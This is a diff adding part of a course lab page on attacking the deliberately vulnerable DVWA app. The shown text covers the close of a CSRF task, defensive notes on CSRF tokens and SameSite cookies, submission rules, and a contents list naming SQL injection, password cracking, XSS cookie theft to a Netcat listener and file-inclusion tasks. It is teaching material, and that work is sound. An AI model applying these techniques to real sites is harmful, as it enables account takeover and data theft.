+<li>If you test stored XSS in the same browser session you used to inject the payload, you will steal <strong>your own</strong> cookie, which does not count as an account compromise!</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-1-4">📌 Deliverables for Task 1: </h4>
+<p>✅ Screenshot: CSRF attack successfully changing the password.<br>
+✅ Screenshot: Captured request showing CSRF vulnerability in GET request.<br>
+✅ Answers the following questions:</p>
+<ul>
+<li><strong>Q13.</strong> Why is a GET request for password changes insecure?</li>
+<li><strong>Q14.</strong> How does this attack work without JavaScript?</li>
+<li><strong>Q15.</strong> How could DVWA prevent this attack?</li>
+</ul>
+<hr>
+<h4 id="-educational-notes-preventing-csrf-attacks"><strong>✅ Educational Notes: Preventing CSRF Attacks</strong> </h4>
+<p>🔹 <strong>How should developers prevent CSRF attacks?</strong></p>
+<p>1️⃣ <strong>Use CSRF Tokens</strong></p>
+<ul>
+<li>Each sensitive request should require a <strong>unique, unpredictable CSRF token</strong>.</li>
+<li>Example CSRF token implementation in HTML:<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf_token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>e9d1a6f5b2c0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+</code></pre></li>
+</ul>
+<p>2️⃣ <strong>Do Not Use GET Requests for Sensitive Actions</strong></p>
+<ul>
+<li>Password changes should <strong>always</strong> use a <strong>POST request</strong>, not GET.</li>
+</ul>
+<p>3️⃣ <strong>SameSite Cookies</strong></p>
+<ul>
+<li>Set cookies with the <strong><code>SameSite</code> flag</strong> to prevent cross-origin requests:<pre data-role="codeBlock" data-info="http" class="language-http http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=xyz123; HttpOnly; Secure; SameSite=Strict</span></span>
+</code></pre></li>
+</ul>
+<p>4️⃣ <strong>Referer Header Validation</strong></p>
+<ul>
+<li>Only allow requests from <strong>trusted origins</strong> by checking the <code>Referer</code> header.</li>
+</ul>
+<p>5️⃣ <strong>User Authentication for Sensitive Actions</strong></p>
+<ul>
+<li>Require <strong>password confirmation</strong> before executing critical actions.</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="lab-5-submission-guidelines"><strong>Lab 5: Submission Guidelines</strong> </h2>
+<ol>
+<li>
+<p><strong>Report</strong>:</p>
+<ul>
+<li>Download the provided <a href="./l5_report.md"><em>lab 5 report file</em></a>.</li>
+<li>Complete the report by filling out all required sections, and including all task-level and part-level deliverables.</li>
+</ul>
+</li>
+<li>
+<p><strong>Artifacts (if applicable)</strong>:</p>
+<ul>
+<li>
+<p>Include any files you created during the lab (only if used in your work), such as:</p>
+<ul>
+<li>HTML files (e.g., CSRF page like <code>csrf_attack.html</code>)</li>
+<li>Any saved outputs or notes you generated for your workflow</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Screenshots</strong>:</p>
+<ul>
+<li>
+<p>Include all screenshots referenced in <code>l5_report.md</code>.</p>
+</li>
+<li>
+<p>Place all screenshots in a subfolder named <strong><code>screenshots</code></strong> within the submission folder.</p>
+</li>
+<li>
+<p><strong>Reminder</strong>: Embed screenshots in the report using Markdown syntax:</p>
+<pre data-role="codeBlock" data-info="markdown" class="language-markdown markdown"><code><span class="token url"><span class="token operator">!</span>[<span class="token content">Screenshot Description</span>](<span class="token url">./screenshots/filename.png</span>)</span>
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Convert to PDF (Required)</strong></p>
+<ul>
+<li>Convert <strong><code>l5_report.md</code></strong> into PDF (<strong><code>l5_report.pdf</code></strong>), as you did in Labs 2–4.</li>
+<li>Ensure all formatting, including headings, code blocks, and screenshots, is preserved.</li>
+</ul>
+</li>
+<li>
+<p><strong>Submission Format</strong>:</p>
+<ul>
+<li>Combine all files (<strong><code>l5_report.pdf</code></strong>, <strong><code>l5_report.md</code></strong>, any artifacts (if applicable), and the <strong><code>screenshots</code></strong> folder) into a compressed <strong><code>.zip</code></strong> file.</li>
+<li>Name the compressed file as <strong><code>Lab5.zip</code></strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Final Submission</strong>:</p>
+<ul>
+<li>Upload the <strong><code>Lab5.zip</code></strong> file to Canvas by the deadline.</li>
+</ul>
+</li>
+</ol>
+<div style="text-align: center; margin: 10px 0;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+
+      </div>
+      <div class="md-sidebar-toc">
+<div class="md-toc">
+<details style="padding:0;;padding-left:0px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#️-lab-environment-setup" class="md-toc-link"><p><strong>⚙️ Lab Environment Setup</strong></p>
+</a>
+          </summary>
+        <div>
+          <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#️-part-1-reconnaissance--web-scanning-10-pts" class="md-toc-link"><p><strong>🛠️ Part 1: Reconnaissance &amp; Web Scanning (10 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-1-discover-web-services-5-pts" class="md-toc-link"><p><strong>🔹 Task 1: Discover Web Services (5 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-goal" class="md-toc-link">
+            <p><strong>📌 Goal:</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-run-nmap-to-detect-open-web-ports" class="md-toc-link">
+            <p><strong>🔹 Step 1: Run Nmap to Detect Open Web Ports</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-analyze-the-web-services" class="md-toc-link">
+            <p><strong>🔹 Step 2: Analyze the Web Services</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-1" class="md-toc-link">
+            <p>📌 Deliverables for Task 1:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-2-web-directory-enumeration-5-pts" class="md-toc-link"><p><strong>🔹 Task 2: Web Directory Enumeration (5 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-goal-1" class="md-toc-link">
+            <p><strong>📌 Goal:</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-scan-for-web-directories-with-dirb" class="md-toc-link">
+            <p><strong>🔹 Step 1: Scan for Web Directories with <code>dirb</code></strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-perform-a-deeper-scan-for-file-extensions" class="md-toc-link">
+            <p><strong>🔹 Step 2: Perform a Deeper Scan for File Extensions</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-2" class="md-toc-link">
+            <p>📌 Deliverables for Task 2:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-3-identify-technologies-used-by-the-web-apps" class="md-toc-link"><p><strong>🔹 Task 3: Identify Technologies Used by the Web Apps</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-3" class="md-toc-link">
+            <p>📌 Deliverables for Task 3:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-4-web-server-vulnerability--misconfiguration-scan-with-nikto" class="md-toc-link"><p><strong>🔹 Task 4: Web Server Vulnerability &amp; Misconfiguration Scan with Nikto</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-goal-2" class="md-toc-link">
+            <p>📌 <strong>Goal:</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-run-nikto-against-the-web-server" class="md-toc-link">
+            <p><strong>🔹 Step 1: Run Nikto Against the Web Server</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-optional-save-output-to-a-file" class="md-toc-link">
+            <p><strong>🔹 Step 2 (Optional): Save Output to a File</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-what-this-tells-us-examples" class="md-toc-link">
+            <p><strong>🔹 What This Tells Us (Examples)</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-4" class="md-toc-link">
+            <p>📌 Deliverables for Task 4:</p>
+
+          </a></div>
+        </div>
+      </details>
+    
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-part-2-sql-injection-sqli-30-pts" class="md-toc-link">
+            <p><strong>🔹 Part 2: SQL Injection (SQLi) (30 pts)</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-objective" class="md-toc-link"><p><strong>📌 Objective:</strong></p>
+</a>
+          </summary>
+        <div>
+          <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-1-manually-exploit-sql-injection-in-dvwa-15-pts" class="md-toc-link"><p><strong>🔹 Task 1: Manually Exploit SQL Injection in DVWA (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-open-dvwa-and-access-the-sql-injection-page" class="md-toc-link">
+            <p><strong>🔹 Step 1: Open DVWA and Access the SQL Injection Page</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-step-2-try-a-basic-authentication-bypass" class="md-toc-link"><p><strong>🔹 Step 2: Try a Basic Authentication Bypass</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-explanation-of-the-payload" class="md-toc-link">
+            <p><strong>📝 Explanation of the Payload:</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-3-extract-user-credentials-from-the-database" class="md-toc-link">
+            <p><strong>🔹 Step 3: Extract User Credentials from the Database</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-explanation-of-the-payload-1" class="md-toc-link">
+            <p><strong>📝 Explanation of the Payload:</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-1-1" class="md-toc-link">
+            <p>📌 Deliverables for Task 1:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-2-automate-sql-injection-with-sqlmap-15-pts" class="md-toc-link"><p><strong>🔹 Task 2: Automate SQL Injection with SQLmap (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#goal" class="md-toc-link">
+            <p><strong>Goal</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-retrieve-the-phpsessid-from-browser-cookies" class="md-toc-link">
+            <p><strong>🔹 Step 1: Retrieve the <code>PHPSESSID</code> from Browser Cookies</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-use-sqlmap-with-the-correct-session-id" class="md-toc-link">
+            <p><strong>🔹 Step 2: Use SQLMap with the Correct Session ID</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-troubleshooting-if-youre-redirected-to-the-login-page" class="md-toc-link"><p><strong>🔹 Troubleshooting (If You’re Redirected to the Login Page)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-option-1-recheck-phpsessid" class="md-toc-link">
+            <p><strong>✅ Option 1: Recheck PHPSESSID</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-option-2-capture-full-cookie-string-if-needed" class="md-toc-link">
+            <p><strong>✅ Option 2: Capture Full Cookie String (If Needed)</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-option-3-ignore-redirects" class="md-toc-link">
+            <p><strong>✅ Option 3: Ignore Redirects</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-3-extract-user-credentials" class="md-toc-link">
+            <p><strong>🔹 Step 3: Extract User Credentials</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-4-dump-the-users-table" class="md-toc-link">
+            <p><strong>🔹 Step 4: Dump the Users Table</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-step-5-crack-the-password-hashes" class="md-toc-link"><p><strong>🛠 Step 5: Crack the Password Hashes</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-1️⃣-extract-the-password-hashes" class="md-toc-link">
+            <p><strong>📌 1️⃣ Extract the Password Hashes</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-2️⃣-identify-the-hash-type" class="md-toc-link">
+            <p><strong>📌 2️⃣ Identify the Hash Type</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-3️⃣-crack-passwords-using-john-the-ripper" class="md-toc-link">
+            <p><strong>📌 3️⃣ Crack Passwords Using John the Ripper</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-2-1" class="md-toc-link">
+            <p>📌 Deliverables for Task 2:</p>
+
+          </a></div>
+        </div>
+      </details>
+    
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#part-3-cross-site-scripting-xss-30-pts" class="md-toc-link">
+            <p><strong>Part 3: Cross-Site Scripting (XSS) (30 pts)</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-objective-1" class="md-toc-link"><p><strong>📌 Objective:</strong></p>
+</a>
+          </summary>
+        <div>
+          <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-1-exploit-reflected-xss-10-pts" class="md-toc-link"><p><strong>🔹 Task 1: Exploit Reflected XSS (10 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-open-the-reflected-xss-page" class="md-toc-link">
+            <p><strong>🔹 Step 1: Open the Reflected XSS Page</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-inject-a-simple-xss-payload" class="md-toc-link">
+            <p><strong>🔹 Step 2: Inject a Simple XSS Payload</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#step-3-modify-the-attack-to-steal-cookies-to-netcat" class="md-toc-link">
+            <p><strong>Step 3: Modify the Attack to Steal Cookies to Netcat</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-1-2" class="md-toc-link">
+            <p>📌 Deliverables for Task 1:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-2-exploit-stored-xss-10-pts" class="md-toc-link"><p><strong>🔹 Task 2: Exploit Stored XSS (10 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-basic-stored-xss-10-pts" class="md-toc-link"><p><strong>🔹 Basic Stored XSS (10 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-why-is-this-dangerous" class="md-toc-link">
+            <p><strong>📝 Why Is This Dangerous?</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-2-2" class="md-toc-link">
+            <p>📌 Deliverables for Task 2:</p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-3-advanced-stored-xss-multi-step-cookie-theft-10-pts" class="md-toc-link"><p><strong>🔹 Task 3: Advanced Stored XSS: Multi-Step Cookie Theft (10 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-inject-the-first-message" class="md-toc-link">
+            <p><strong>🔹 Step 1: Inject the First Message</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-inject-the-second-message" class="md-toc-link">
+            <p><strong>🔹 Step 2: Inject the Second Message</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-3-inject-the-final-execution-message" class="md-toc-link">
+            <p><strong>🔹 Step 3: Inject the Final Execution Message</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-4-set-up-an-attacker-listener-on-kali" class="md-toc-link">
+            <p><strong>🔹 Step 4: Set Up an Attacker Listener on Kali</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-5-verify-the-attack" class="md-toc-link">
+            <p><strong>🔹 Step 5: Verify the Attack</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-deliverables-for-task-3-1" class="md-toc-link"><p>📌 Deliverables for Task 3:</p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-educational-notes-best-practices-to-prevent-xss" class="md-toc-link">
+            <p><strong>✅ Educational Notes: Best Practices to Prevent XSS</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-part-4-directory-traversal-local-file-inclusion---lfi-15-pts" class="md-toc-link"><p><strong>🔹 Part 4: Directory Traversal (Local File Inclusion - LFI) (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-objective-2" class="md-toc-link">
+            <p><strong>📌 Objective:</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-1-exploit-local-file-inclusion-lfi-15-pts" class="md-toc-link"><p><strong>🔹 Task 1: Exploit Local File Inclusion (LFI) (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-open-the-file-inclusion-page" class="md-toc-link">
+            <p><strong>🔹 Step 1: Open the File Inclusion Page</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-read-system-files-using-path-traversal" class="md-toc-link">
+            <p><strong>🔹 Step 2: Read System Files Using Path Traversal</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-1-3" class="md-toc-link">
+            <p>📌 Deliverables for Task 1:</p>
+
+          </a></div>
+        </div>
+      </details>
+    
+        </div>
+      </details>
+    <details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-part-5-cross-site-request-forgery-csrf-15-pts" class="md-toc-link"><p><strong>🔹 Part 5: Cross-Site Request Forgery (CSRF) (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-objective-3" class="md-toc-link">
+            <p><strong>📌 Objective:</strong></p>
+
+          </a></div><details style="padding:0;;padding-left:24px;" open="">
+        <summary class="md-toc-link-wrapper">
+          <a href="#-task-1-perform-a-basic-csrf-attack-using-a-simple-link-15-pts" class="md-toc-link"><p><strong>🔹 Task 1: Perform a Basic CSRF Attack Using a Simple Link (15 pts)</strong></p>
+</a>
+          </summary>
+        <div>
+          <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-1-open-the-csrf-page" class="md-toc-link">
+            <p><strong>🔹 Step 1: Open the CSRF Page</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-2-understand-the-password-change-request" class="md-toc-link">
+            <p><strong>🔹 Step 2: Understand the Password Change Request</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-3-craft-a-csrf-exploit-using-a-simple-link" class="md-toc-link">
+            <p><strong>🔹 Step 3: Craft a CSRF Exploit Using a Simple Link</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-step-4-test-the-attack" class="md-toc-link">
+            <p><strong>🔹 Step 4: Test the Attack</strong></p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-educational-note" class="md-toc-link">
+            <p>📌 Educational Note</p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-deliverables-for-task-1-4" class="md-toc-link">
+            <p>📌 Deliverables for Task 1:</p>
+
+          </a></div><div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#-educational-notes-preventing-csrf-attacks" class="md-toc-link">
+            <p><strong>✅ Educational Notes: Preventing CSRF Attacks</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    
+        </div>
+      </details>
+    <div class="md-toc-link-wrapper" style="padding:0;;display:list-item;list-style:square;margin-left:42px">
+          <a href="#lab-5-submission-guidelines" class="md-toc-link">
+            <p><strong>Lab 5: Submission Guidelines</strong></p>
+
+          </a></div>
+        </div>
+      </details>
+    
+</div>
+</div>
+      <a id="sidebar-toc-btn">≡</a>
+    
+    
+    
+    
+    
+    
+<script>
+
+var sidebarTOCBtn = document.getElementById('sidebar-toc-btn')
+sidebarTOCBtn.addEventListener('click', function(event) {
+  event.stopPropagation()
+  if (document.body.hasAttribute('html-show-sidebar-toc')) {
+    document.body.removeAttribute('html-show-sidebar-toc')
+  } else {
+    document.body.setAttribute('html-show-sidebar-toc', true)
+  }
+})
+</script>
+      
+  
+    </body></html>
